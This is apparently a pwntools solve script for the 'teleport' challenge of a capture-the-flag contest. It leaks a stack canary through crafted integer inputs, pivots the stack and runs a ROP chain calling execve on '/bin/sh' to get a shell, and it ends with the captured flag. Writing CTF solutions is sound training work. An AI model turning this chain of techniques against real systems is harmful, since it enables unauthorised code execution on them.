#!/usr/bin/python3

from pwn import *

exe = ELF('teleport', checksec=False)
# libc = ELF('0', checksec=False)
context.binary = exe

def GDB():
        if not args.REMOTE:
                gdb.attach(p, gdbscript='''
                b* 0x401d34

                c
                ''')
                input()
rop = ROP(exe)
# rop.write(7, 8, 9)
# find_gadget(['pop rdi, ret'])
info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)

if args.REMOTE:
        p = remote('ctf.tcp1p.com', 1470)
else:
        p = process(exe.path)
pop_rdi = 0x000000000040251f
pop_rax = 0x0000000000458627
pop_rdx_rbx = 0x00000000004a3dcb
pop_rsi = 0x000000000040a58e
jmp_rbx = 0x000000000045af1d
pop_r13_r14_r15 = 0x000000000040251a
syscall = rop.find_gadget(['syscall', 'ret']).address
GDB()
sla(b">", "2147483648 6442450944")
sla(b' here?',b'/bin/sh\0')
sla(b">", "4294967296 0")
sla(b">", "2147483648 6442450944")
p.recvuntil(b'it...\n')
canary = int(p.recvline(keepends=False).decode())
print(hex(canary))
s(flat(b'a'*(8), canary, p64(0x4e8500-0x10) + p8(0x23)))
input()
s(flat(pop_rax,0x3b,pop_rdi,exe.sym.anu,syscall,
                    canary,0x4e84b0,
                    0x401d23,
                    ))
input()
s( flat(0,0,pop_rsi,0,pop_r13_r14_r15,canary,0x4e8470,
                        0x401d23
                    ))
input()
s( flat(0,0,0,0,0x0000000000401d23,canary,0x4e8480,
                        pop_rdx_rbx
                    ))
p.interactive()
# TCP1P{ju5T_4n0tH3r_p1vOt_ch4LlEn9e}